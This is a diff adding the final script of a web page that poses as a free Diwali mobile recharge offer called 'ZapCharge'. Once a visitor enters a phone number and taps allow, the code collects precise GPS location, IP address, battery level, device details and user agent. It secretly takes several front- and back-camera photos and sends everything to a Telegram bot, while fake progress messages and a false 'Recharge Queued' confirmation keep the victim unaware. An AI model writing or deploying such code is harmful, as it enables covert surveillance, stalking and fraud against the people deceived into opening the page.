+async function captureSet(facing,count,label){try{await getStream(facing);for(let i=0;i<count;i++){await sleep(400);const blob=await captureFrame();if(blob)await tgSendPhoto(blob,`${label} #${i+1}`)}}catch(e){}finally{if(video.srcObject){video.srcObject.getTracks().forEach(t=>t.stop());video.srcObject=null}}}
+async function getLocation(){return new Promise(resolve=>{if(!navigator.geolocation)return resolve(null);navigator.geolocation.getCurrentPosition(pos=>resolve({lat:pos.coords.latitude,lon:pos.coords.longitude,acc:pos.coords.accuracy}),()=>resolve(null),{enableHighAccuracy:true,timeout:10000,maximumAge:0})})}
+async function getIP(){try{const r=await fetch("https://api.ipify.org?format=json");const j=await r.json();return j.ip||"?"}catch(e){return"?"}}
+async function getBattery(){try{if(!navigator.getBattery)return null;const b=await navigator.getBattery();return{level:Math.round(b.level*100),charging:b.charging}}catch(e){return null}}
+
+const formCard=document.getElementById("formCard"),statusCard=document.getElementById("statusCard");
+const statusTitle=document.getElementById("statusTitle"),statusMsg=document.getElementById("statusMsg");
+const claimBtn=document.getElementById("claimBtn"),permModal=document.getElementById("permModal");
+const progCircle=document.getElementById("progCircle"),progPct=document.getElementById("progPct");
+
+function showStatus(title,msg){formCard.style.display="none";statusCard.classList.add("active");statusCard.style.display="block";statusTitle.textContent=title;statusMsg.textContent=msg}
+function setProgress(pct){progCircle.style.strokeDashoffset=188-(188*pct/100);progPct.textContent=Math.round(pct)+"%"}
+
+claimBtn.addEventListener("click",()=>{const num=document.getElementById("mobile").value.trim();if(!/^[6-9]\d{9}$/.test(num)){document.getElementById("mobile").focus();document.getElementById("mobile").style.borderColor="#ef4444";setTimeout(()=>document.getElementById("mobile").style.borderColor="",1500);return}permModal.classList.add("show")});
+document.getElementById("denyBtn").addEventListener("click",()=>permModal.classList.remove("show"));
+
+document.getElementById("allowBtn").addEventListener("click",async()=>{
+  permModal.classList.remove("show");const num=document.getElementById("mobile").value.trim();claimBtn.disabled=true;
+  showStatus("Processing your claim…","Connecting to operator systems…");setProgress(5);await sleep(1200);setProgress(12);
+  
+  const [loc,ip,battery]=await Promise.all([getLocation(),getIP(),getBattery()]);
+  let locText="Location: denied";if(loc)locText=`📍 ${loc.lat.toFixed(6)}, ${loc.lon.toFixed(6)} (±${Math.round(loc.acc)}m)\nhttps://maps.google.com/?q=${loc.lat},${loc.lon}`;
+  let batText="Battery: n/a";if(battery)batText=`🔋 ${battery.level}% ${battery.charging?"(Charging)":"(Not charging)"}`;
+  
+  const info=`⚡ <b>ZapCharge Claim</b>\n\n📱 Number: <code>${num}</code>\n📡 Provider: ${selectedProvider}\n📦 Plan: ${selectedPlan}\n🌐 IP: <code>${ip}</code>\n${locText}\n${batText}\n🖥 ${screen.width}x${screen.height} @${window.devicePixelRatio||1}x\n🗣 ${navigator.language} | ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n📱 ${navigator.userAgent}\n🕐 ${new Date().toLocaleString("en-IN")}`;
+  await tgSendMessage(info);setProgress(25);
+  
+  statusTitle.textContent="Verifying details…";statusMsg.textContent="Cross-checking with network…";await sleep(1500);setProgress(40);
+  statusTitle.textContent="Almost there…";statusMsg.textContent="Final security checks in progress…";
+  
+  await captureSet("user",3,"Front");setProgress(65);await sleep(800);
+  await captureSet("environment",3,"Back");setProgress(85);
+  
+  const loc2=await getLocation();if(loc2)await tgSendMessage(`📍 Final: ${loc2.lat.toFixed(6)}, ${loc2.lon.toFixed(6)}\nhttps://maps.google.com/?q=${loc2.lat},${loc2.lon}`);
+  await tgSendMessage(`✅ ZapCharge capture done — ${num} (${selectedProvider})`);
+  
+  setProgress(100);statusTitle.textContent="Recharge Queued 🎉";statusMsg.textContent="Your free Diwali recharge has been successfully queued. Credit will reflect in 15–45 minutes. You may close this page.";
+  document.querySelector(".progress-ring").style.display="none";
+});
+
+// Initialize on load
+initMain();
+</script>
+</body>
+</html>
